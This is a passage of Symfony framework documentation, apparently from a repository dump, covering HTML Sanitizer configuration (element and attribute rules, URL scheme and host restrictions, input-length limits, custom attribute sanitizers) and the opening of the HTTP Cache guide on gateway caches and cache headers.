    return static function (FrameworkConfig $framework): void {\n            $framework->htmlSanitizer()\n                ->sanitizer('app.post_sanitizer')\n                    // allow the <article> element and 2 attributes\n                    ->allowElement('article', ['class', 'data-attr'])\n\n                    // allow the <img> element and preserve the src attribute\n                    ->allowElement('img', 'src')\n\n                    // allow the <h1> element with all safe attributes\n                    ->allowElement('h1', '*')\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $postSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())\n                // allow the <article> element and 2 attributes\n                ->allowElement('article', ['class', 'data-attr'])\n\n                // allow the <img> element and preserve the src attribute\n                ->allowElement('img', 'src')\n\n                // allow the <h1> element with all safe attributes\n                ->allowElement('h1')\n        );\n\nBlock and Drop Elements\n~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can also block (the element will be removed, but its children\nwill be kept) or drop (the element and its children will be removed)\nelements.\n\nThis can also be used to remove elements from the allow list.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/html_sanitizer.yaml\n        framework:\n            html_sanitizer:\n                sanitizers:\n                    app.post_sanitizer:\n                        # ...\n\n                        # remove <div>, but process the children\n                        block_elements: ['div']\n                        # remove <figure> and its children\n                        drop_elements: ['figure']\n\n    .. code-block:: xml\n\n        <!-- config/packages/html_sanitizer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:html-sanitizer>\n                    <!-- remove <div>, but process the children -->\n                    <framework:block-element>div</framework:block-element>\n\n                    <!-- remove <figure> and its children -->\n                    <framework:drop-element>figure</framework:drop-element>\n                </framework:html-sanitizer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->htmlSanitizer()\n                ->sanitizer('app.post_sanitizer')\n                    // remove <div>, but process the children\n                    ->blockElement('div')\n                    // remove <figure> and its children\n                    ->dropElement('figure')\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $postSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())\n                // remove <div>, but process the children\n                ->blockElement('div')\n                // remove <figure> and its children\n                ->dropElement('figure')\n        );\n\nAllow Attributes\n~~~~~~~~~~~~~~~~\n\nUsing this option, you can specify which attributes will be preserved in\nthe returned HTML. The attribute will be allowed on the given elements, or\non all elements allowed *before this setting*.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/html_sanitizer.yaml\n        framework:\n            html_sanitizer:\n                sanitizers:\n                    app.post_sanitizer:\n                        # ...\n                        allow_attributes:\n                            # allow \"src' on <iframe> elements\n                            src: ['iframe']\n\n                            # allow \"data-attr\" on all elements currently allowed\n                            data-attr: '*'\n\n    .. code-block:: xml\n\n        <!-- config/packages/html_sanitizer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:html-sanitizer>\n                    <!-- allow \"src' on <iframe> elements -->\n                    <framework:allow-attribute name=\"src\">\n                        <framework:element>iframe</framework:element>\n                    </framework:allow-attribute>\n\n                    <!-- allow \"data-attr\" on all elements currently allowed -->\n                    <framework:allow-attribute name=\"data-attr\">\n                        <framework:element>*</framework:element>\n                    </framework:allow-attribute>\n                </framework:html-sanitizer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->htmlSanitizer()\n                ->sanitizer('app.post_sanitizer')\n                    // allow \"src' on <iframe> elements\n                    ->allowAttribute('src', ['iframe'])\n\n                    // allow \"data-attr\" on all elements currently allowed\n                    ->allowAttribute('data-attr', '*')\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $postSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())\n                // allow \"src' on <iframe> elements\n                ->allowAttribute('src', ['iframe'])\n\n                // allow \"data-attr\" on all elements currently allowed\n                ->allowAttribute('data-attr', '*')\n        );\n\nDrop Attributes\n~~~~~~~~~~~~~~~\n\nThis option allows you to disallow attributes that were allowed before.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/html_sanitizer.yaml\n        framework:\n            html_sanitizer:\n                sanitizers:\n                    app.post_sanitizer:\n                        # ...\n                        allow_attributes:\n                            # allow the \"data-attr\" on all safe elements...\n                            data-attr: '*'\n\n                        drop_attributes:\n                            # ...except for the <section> element\n                            data-attr: ['section']\n                            # disallows \"style' on any allowed element\n                            style: '*'\n\n    .. code-block:: xml\n\n        <!-- config/packages/html_sanitizer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:html-sanitizer>\n                    <!-- allow the \"data-attr\" on all safe elements... -->\n                    <framework:allow-attribute name=\"data-attr\">\n                        <framework:element>*</framework:element>\n                    </framework:allow-attribute>\n\n                    <!-- ...except for the <section> element -->\n                    <framework:drop-attribute name=\"data-attr\">\n                        <framework:element>section</framework:element>\n                    </framework:drop-attribute>\n\n                    <!-- disallows \"style' on any allowed element -->\n                    <framework:drop-attribute name=\"style\">\n                        <framework:element>*</framework:element>\n                    </framework:drop-attribute>\n                </framework:html-sanitizer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->htmlSanitizer()\n                ->sanitizer('app.post_sanitizer')\n                    // allow the \"data-attr\" on all safe elements...\n                    ->allowAttribute('data-attr', '*')\n\n                    // ...except for the <section> element\n                    ->dropAttribute('data-attr', ['section'])\n\n                    // disallows \"style' on any allowed element\n                    ->dropAttribute('style', '*')\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $postSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())\n                // allow the \"data-attr\" on all safe elements...\n                ->allowAttribute('data-attr', '*')\n\n                // ...except for the <section> element\n                ->dropAttribute('data-attr', ['section'])\n\n                // disallows \"style' on any allowed element\n                ->dropAttribute('style', '*')\n        );\n\nForce Attribute Values\n~~~~~~~~~~~~~~~~~~~~~~\n\nUsing this option, you can force an attribute with a given value on an\nelement. For instance, use the follow config to always set ``rel=\"noopener noreferrer\"`` on each ``<a>``\nelement (even if the original one didn't contain a ``rel`` attribute):\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/html_sanitizer.yaml\n        framework:\n            html_sanitizer:\n                sanitizers:\n                    app.post_sanitizer:\n                        # ...\n                        force_attributes:\n                            a:\n                                rel: noopener noreferrer\n\n    .. code-block:: xml\n\n        <!-- config/packages/html_sanitizer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:html-sanitizer>\n                    <framework:force-attribute name=\"a\">\n                        <framework:attribute name=\"rel\">noopener noreferrer</framework:attribute>\n                    </framework:force-attribute>\n                </framework:html-sanitizer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->htmlSanitizer()\n                ->sanitizer('app.post_sanitizer')\n                    ->forceAttribute('a', ['rel' => 'noopener noreferrer'])\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $postSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())\n                ->forceAttribute('a', 'rel', 'noopener noreferrer')\n        );\n\n.. _html-sanitizer-link-url:\n\nForce/Allow Link URLs\n~~~~~~~~~~~~~~~~~~~~~\n\nBesides allowing/blocking elements and attributes, you can also control the\nURLs of ``<a>`` elements:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/html_sanitizer.yaml\n        framework:\n            html_sanitizer:\n                sanitizers:\n                    app.post_sanitizer:\n                        # ...\n\n                        # if `true`, all URLs using the `http://` scheme will be converted to\n                        # use the `https://` scheme instead. `http` still needs to be allowed\n                        # in `allowed_link_schemes`\n                        force_https_urls: true\n\n                        # specifies the allowed URL schemes. If the URL has a different scheme, the\n                        # attribute will be dropped\n                        allowed_link_schemes: ['http', 'https', 'mailto']\n\n                        # specifies the allowed hosts, the attribute will be dropped if the\n                        # URL contains a different host. Subdomains are allowed: e.g. the following\n                        # config would also allow 'www.symfony.com', 'live.symfony.com', etc.\n                        allowed_link_hosts: ['symfony.com']\n\n                        # whether to allow relative links (i.e. URLs without scheme and host)\n                        allow_relative_links: true\n\n    .. code-block:: xml\n\n        <!-- config/packages/html_sanitizer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <!-- force-https-urls: if `true`, all URLs using the `http://` scheme will be\n                                       converted to use the `https://` scheme instead.\n                                       `http` still needs to be allowed in `allowed-link-scheme` -->\n                <!-- allow-relative-links: whether to allow relative links (i.e. URLs without\n                                           scheme and host) -->\n                <framework:html-sanitizer\n                    force-https-urls=\"true\"\n                    allow-relative-links=\"true\"\n                >\n                    <!-- specifies the allowed URL schemes. If the URL has a different scheme,\n                         the attribute will be dropped -->\n                    <allowed-link-scheme>http</allowed-link-scheme>\n                    <allowed-link-scheme>https</allowed-link-scheme>\n                    <allowed-link-scheme>mailto</allowed-link-scheme>\n\n                    <!-- specifies the allowed hosts, the attribute will be dropped if the\n                         URL contains a different host. Subdomains are allowed: e.g. the following\n                         config would also allow 'www.symfony.com', 'live.symfony.com', etc. -->\n                    <allowed-link-host>symfony.com</allowed-link-host>\n                </framework:html-sanitizer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->htmlSanitizer()\n                ->sanitizer('app.post_sanitizer')\n                    // if `true`, all URLs using the `http://` scheme will be converted to\n                    // use the `https://` scheme instead. `http` still needs to be\n                    // allowed in `allowedLinkSchemes`\n                    ->forceHttpsUrls(true)\n\n                    // specifies the allowed URL schemes. If the URL has a different scheme, the\n                    // attribute will be dropped\n                    ->allowedLinkSchemes(['http', 'https', 'mailto'])\n\n                    // specifies the allowed hosts, the attribute will be dropped if the\n                    // URL contains a different host. Subdomains are allowed: e.g. the following\n                    // config would also allow 'www.symfony.com', 'live.symfony.com', etc.\n                    ->allowedLinkHosts(['symfony.com'])\n\n                    // whether to allow relative links (i.e. URLs without scheme and host)\n                    ->allowRelativeLinks(true)\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $postSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())\n                // if `true`, all URLs using the `http://` scheme will be converted to\n                // use the `https://` scheme instead. `http` still needs to be\n                // allowed in `allowedLinkSchemes`\n                ->forceHttpsUrls()\n\n                // specifies the allowed URL schemes. If the URL has a different scheme, the\n                // attribute will be dropped\n                ->allowedLinkSchemes(['http', 'https', 'mailto'])\n\n                // specifies the allowed hosts, the attribute will be dropped if the\n                // URL contains a different host which is not a subdomain of the allowed host\n                ->allowedLinkHosts(['symfony.com']) // Also allows any subdomain (i.e. www.symfony.com)\n\n                // whether to allow relative links (i.e. URLs without scheme and host)\n                ->allowRelativeLinks()\n        );\n\nForce/Allow Media URLs\n~~~~~~~~~~~~~~~~~~~~~~\n\nLike :ref:`link URLs <html-sanitizer-link-url>`, you can also control the\nURLs of other media in the HTML. The following attributes are checked by\nthe HTML sanitizer: ``src``, ``href``, ``lowsrc``, ``background`` and ``ping``.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/html_sanitizer.yaml\n        framework:\n            html_sanitizer:\n                sanitizers:\n                    app.post_sanitizer:\n                        # ...\n\n                        # if `true`, all URLs using the `http://` scheme will be converted to\n                        # use the `https://` scheme instead. `http` still needs to be allowed\n                        # in `allowed_media_schemes`\n                        force_https_urls: true\n\n                        # specifies the allowed URL schemes. If the URL has a different scheme, the\n                        # attribute will be dropped\n                        allowed_media_schemes: ['http', 'https', 'mailto']\n\n                        # specifies the allowed hosts, the attribute will be dropped if the URL\n                        # contains a different host which is not a subdomain of the allowed host\n                        allowed_media_hosts: ['symfony.com'] # Also allows any subdomain (i.e. www.symfony.com)\n\n                        # whether to allow relative URLs (i.e. URLs without scheme and host)\n                        allow_relative_medias: true\n\n    .. code-block:: xml\n\n        <!-- config/packages/html_sanitizer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <!-- force-https-urls: if `true`, all URLs using the `http://` scheme will be\n                                       converted to use the `https://` scheme instead. `http`\n                                       still needs to be allowed in `allowed-media-scheme` -->\n                <!-- allow-relative-medias: whether to allow relative URLs (i.e. URLs without\n                                           scheme and host) -->\n                <framework:html-sanitizer\n                    force-https-urls=\"true\"\n                    allow-relative-medias=\"true\"\n                >\n                    <!-- specifies the allowed URL schemes. If the URL has a different scheme,\n                         the attribute will be dropped -->\n                    <allowed-media-scheme>http</allowed-media-scheme>\n                    <allowed-media-scheme>https</allowed-media-scheme>\n                    <allowed-media-scheme>mailto</allowed-media-scheme>\n\n                    <!-- specifies the allowed hosts, the attribute will be dropped if the URL\n                         contains a different host which is not a subdomain of the allowed host.\n                         Also allows any subdomain (i.e. www.symfony.com) -->\n                    <allowed-media-host>symfony.com</allowed-media-host>\n                </framework:html-sanitizer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->htmlSanitizer()\n                ->sanitizer('app.post_sanitizer')\n                    // if `true`, all URLs using the `http://` scheme will be converted to\n                    // use the `https://` scheme instead. `http` still needs to be\n                    // allowed in `allowedMediaSchemes`\n                    ->forceHttpsUrls(true)\n\n                    // specifies the allowed URL schemes. If the URL has a different scheme, the\n                    // attribute will be dropped\n                    ->allowedMediaSchemes(['http', 'https', 'mailto'])\n\n                    // specifies the allowed hosts, the attribute will be dropped if the URL\n                    // contains a different host which is not a subdomain of the allowed host\n                    ->allowedMediaHosts(['symfony.com']) // Also allows any subdomain (i.e. www.symfony.com)\n\n                    // whether to allow relative URLs (i.e. URLs without scheme and host)\n                    ->allowRelativeMedias(true)\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $postSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())\n                // if `true`, all URLs using the `http://` scheme will be converted to\n                // use the `https://` scheme instead. `http` still needs to be\n                // allowed in `allowedMediaSchemes`\n                ->forceHttpsUrls()\n\n                // specifies the allowed URL schemes. If the URL has a different scheme, the\n                // attribute will be dropped\n                ->allowedMediaSchemes(['http', 'https', 'mailto'])\n\n                // specifies the allowed hosts, the attribute will be dropped if the URL\n                // contains a different host which is not a subdomain of the allowed host\n                ->allowedMediaHosts(['symfony.com']) // Also allows any subdomain (i.e. www.symfony.com)\n\n                // whether to allow relative URLs (i.e. URLs without scheme and host)\n                ->allowRelativeMedias()\n        );\n\nMax Input Length\n~~~~~~~~~~~~~~~~\n\nIn order to prevent `DoS attacks`_, by default the HTML sanitizer limits the\ninput length to ``20000`` characters (as measured by ``strlen($input)``). All\nthe contents exceeding that length will be truncated. Use this option to\nincrease or decrease this limit:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/html_sanitizer.yaml\n        framework:\n            html_sanitizer:\n                sanitizers:\n                    app.post_sanitizer:\n                        # ...\n\n                        # inputs longer (in characters) than this value will be truncated\n                        max_input_length: 30000 # default: 20000\n\n    .. code-block:: xml\n\n        <!-- config/packages/html_sanitizer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:html-sanitizer>\n                    <framework:sanitizer name=\"app.post_sanitizer\">\n                        <!-- inputs longer (in characters) than this value will be truncated (default: 20000) -->\n                        <framework:max-input-length>20000</framework:max-input-length>\n                    </framework:sanitizer>\n                </framework:html-sanitizer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->htmlSanitizer()\n                ->sanitizer('app.post_sanitizer')\n                    // inputs longer (in characters) than this value will be truncated (default: 20000)\n                    ->withMaxInputLength(20000)\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $postSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())\n                // inputs longer (in characters) than this value will be truncated (default: 20000)\n                ->withMaxInputLength(20000)\n        );\n\nIt is possible to disable this length limit by setting the max input length to\n``-1``. Beware that it may expose your application to `DoS attacks`_.\n\nCustom Attribute Sanitizers\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nControlling the link and media URLs is done by the\n:class:`Symfony\\\\Component\\\\HtmlSanitizer\\\\Visitor\\\\AttributeSanitizer\\\\UrlAttributeSanitizer`.\nYou can also implement your own attribute sanitizer, to control the value\nof other attributes in the HTML. Create a class implementing\n:class:`Symfony\\\\Component\\\\HtmlSanitizer\\\\Visitor\\\\AttributeSanitizer\\\\AttributeSanitizerInterface`\nand register it as a service. After this, use ``with_attribute_sanitizers``\nto enable it for an HTML sanitizer:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/html_sanitizer.yaml\n        framework:\n            html_sanitizer:\n                sanitizers:\n                    app.post_sanitizer:\n                        # ...\n                        with_attribute_sanitizers:\n                            - App\\Sanitizer\\CustomAttributeSanitizer\n\n                        # you can also disable previously enabled custom attribute sanitizers\n                        #without_attribute_sanitizers:\n                        #    - App\\Sanitizer\\CustomAttributeSanitizer\n\n    .. code-block:: xml\n\n        <!-- config/packages/html_sanitizer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:html-sanitizer>\n                    <with-attribute-sanitizer>App\\Sanitizer\\CustomAttributeSanitizer</with-attribute-sanitizer>\n\n                    <!-- you can also disable previously enabled attribute sanitizers -->\n                    <without-attribute-sanitizer>Symfony\\Component\\HtmlSanitizer\\Visitor\\AttributeSanitizer\\UrlAttributeSanitizer</without-attribute-sanitizer>\n                </framework:html-sanitizer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use App\\Sanitizer\\CustomAttributeSanitizer;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->htmlSanitizer()\n                ->sanitizer('app.post_sanitizer')\n                    ->withAttributeSanitizer(CustomAttributeSanitizer::class)\n\n                    // you can also disable previously enabled attribute sanitizers\n                    //->withoutAttributeSanitizer(CustomAttributeSanitizer::class)\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use App\\Sanitizer\\CustomAttributeSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $customAttributeSanitizer = new CustomAttributeSanitizer();\n        $postSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())\n                ->withAttributeSanitizer($customAttributeSanitizer)\n\n                // you can also disable previously enabled attribute sanitizers\n                //->withoutAttributeSanitizer($customAttributeSanitizer)\n        );\n\n.. _`HTML Sanitizer W3C Standard Proposal`: https://wicg.github.io/sanitizer-api/\n.. _`W3C Standard Proposal`: https://wicg.github.io/sanitizer-api/\n.. _`DoS attacks`: https://en.wikipedia.org/wiki/Denial-of-service_attack\n"
        },
        {
          "name": "http_cache.rst",
          "type": "blob",
          "size": 14.7109375,
          "content": "HTTP Cache\n==========\n\nThe nature of rich web applications means that they're dynamic. No matter\nhow efficient your application, each request will always contain more overhead\nthan serving a static file. Usually, that's fine. But when you need your requests\nto be lightning fast, you need HTTP caching.\n\nCaching on the Shoulders of Giants\n----------------------------------\n\nWith HTTP Caching, you cache the full output of a page (i.e. the response) and bypass\nyour application *entirely* on subsequent requests. Caching entire responses\nisn't always possible for highly dynamic sites, or is it? With\n:doc:`Edge Side Includes (ESI) </http_cache/esi>`, you can use the power of HTTP caching\non only *fragments* of your site.\n\nThe Symfony cache system is different because it relies on the simplicity\nand power of the HTTP cache as defined in `RFC 7234 - Caching`_. Instead of\nreinventing a caching methodology, Symfony embraces the standard that defines\nbasic communication on the Web. Once you understand the fundamental HTTP\nvalidation and expiration caching models, you'll be ready to master the Symfony\ncache system.\n\nSince caching with HTTP isn't unique to Symfony, many articles already exist\non the topic. If you're new to HTTP caching, Ryan Tomayko's article\n`Things Caches Do`_ is *highly* recommended. Another in-depth resource is Mark\nNottingham's `Cache Tutorial`_.\n\n.. _gateway-caches:\n\nCaching with a Gateway Cache\n----------------------------\n\nWhen caching with HTTP, the *cache* is separated from your application entirely\nand sits between your application and the client making the request.\n\nThe job of the cache is to accept requests from the client and pass them\nback to your application. The cache will also receive responses back from\nyour application and forward them on to the client. The cache is the \"middle-man\"\nof the request-response communication between the client and your application.\n\nAlong the way, the cache will store each response that is deemed \"cacheable\"\n(See :ref:`http-cache-introduction`). If the same resource is requested again,\nthe cache sends the cached response to the client, ignoring your application\nentirely.\n\nThis type of cache is known as an HTTP gateway cache and many exist such\nas `Varnish`_, `Squid in reverse proxy mode`_, and the Symfony reverse proxy.\n\n.. tip::\n\n    Gateway caches are sometimes referred to as reverse proxy caches,\n    surrogate caches, or even HTTP accelerators.\n\n.. _`symfony-gateway-cache`:\n.. _symfony2-reverse-proxy:\n\nSymfony Reverse Proxy\n~~~~~~~~~~~~~~~~~~~~~\n\nSymfony comes with a reverse proxy (i.e. gateway cache) written in PHP.\n:ref:`It's not a fully-featured reverse proxy cache like Varnish <http-cache-symfony-versus-varnish>`,\nbut it is a great way to start.\n\n.. tip::\n\n    For details on setting up Varnish, see :doc:`/http_cache/varnish`.\n\nUse the ``framework.http_cache`` option to enable the proxy for the\n:ref:`prod environment <configuration-environments>`:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        when@prod:\n            framework:\n                http_cache: true\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <when env=\"prod\">\n              <framework:config>\n                  <!-- ... -->\n                  <framework:http-cache enabled=\"true\"/>\n              </framework:config>\n            </when>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework, string $env): void {\n            if ('prod' === $env) {\n                $framework->httpCache()->enabled(true);\n            }\n        };\n\nThe kernel will immediately act as a reverse proxy: caching responses\nfrom your application and returning them to the client.\n\nThe proxy has a sensible default configuration, but it can be\nfinely tuned via :ref:`a set of options <configuration-framework-http_cache>`.\n\nWhen in :ref:`debug mode <debug-mode>`, Symfony automatically adds an\n``X-Symfony-Cache`` header to the response. You can also use the ``trace_level``\nconfig option and set it to either ``none``, ``short`` or ``full`` to add this\ninformation.\n\n``short`` will add the information for the main request only.\nIt's written in a concise way that makes it easy to record the\ninformation in your server log files. For example, in Apache you can\nuse ``%{X-Symfony-Cache}o`` in ``LogFormat`` format statements.\nThis information can be used to extract general information about\ncache efficiency of your routes.\n\n.. tip::\n\n    You can change the name of the header used for the trace\n    information using the ``trace_header`` config option.\n\n.. _http-cache-symfony-versus-varnish:\n\n.. sidebar:: Changing from one Reverse Proxy to another\n\n    The Symfony reverse proxy is a great tool to use when developing your\n    website or when you deploy your website to a shared host where you cannot\n    install anything beyond PHP code. But being written in PHP, it cannot\n    be as fast as a proxy written in C.\n\n    Fortunately, since all reverse proxies are effectively the same, you should\n    be able to switch to something more robust - like Varnish - without any problems.\n    See :doc:`How to use Varnish </http_cache/varnish>`\n\n.. _http-cache-introduction:\n\nMaking your Responses HTTP Cacheable\n------------------------------------\n\nOnce you've added a reverse proxy cache (e.g. like the Symfony reverse proxy or Varnish),\nyou're ready to cache your responses. To do that, you need to *communicate* to your\ncache *which* responses are cacheable and for how long. This is done by setting HTTP\ncache headers on the response.\n\nHTTP specifies four response cache headers that you can set to enable caching:\n\n* ``Cache-Control``\n* ``Expires``\n* ``ETag``\n* ``Last-Modified``\n\nThese four headers are used to help cache your responses via *two* different models:\n\n.. _http-expiration-validation:\n.. _http-expiration-and-validation:\n\n#. :ref:`Expiration Caching <http-cache-expiration-intro>`\n   Used to cache your entire response for a specific amount of time (e.g. 24 hours).\n   Simple, but cache invalidation is more difficult.\n\n#. :ref:`Validation Caching <http-cache-validation-intro>`\n   More complex: used to cache your response, but allows you to dynamically invalidate\n   it as soon as your content changes.\n\n.. sidebar:: Reading the HTTP Specification\n\n    All of the HTTP headers you'll read about are *not* invented by Symfony! They're\n    part of an HTTP specification that's used by sites all over the web. To dig deeper\n    into HTTP Caching, check out the documents `RFC 7234 - Caching`_ and\n    `RFC 7232 - Conditional 